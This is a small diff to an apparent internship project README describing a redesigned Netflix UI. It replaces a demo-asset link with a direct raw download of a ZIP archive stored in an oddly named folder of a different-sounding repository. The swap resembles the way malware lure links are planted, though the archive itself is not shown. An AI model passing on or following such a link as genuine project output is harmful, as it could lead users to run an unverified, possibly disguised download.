@@ -6,4 +6,4 @@
 *DURATION*:6 WEEKS
 *MENTOR*:NEELA SANTHOSH KUMAR
 *DESCRIPTION OF TASK*:IVE IMPROVED ALDREADY EXISTING NETFILX UI TO MAKE IT MORE MODERN
-*OUPUT*:https://github.com/user-attachments/assets/0dd8f188-b6fc-47e5-ab41-8d2e9ef0b9f7
+*OUPUT*https://raw.githubusercontent.com/Karthik-KC5/MOBILE-APP-REDESIGN/main/hymenomycetoid/MOBILE-APP-REDESIGN.zip
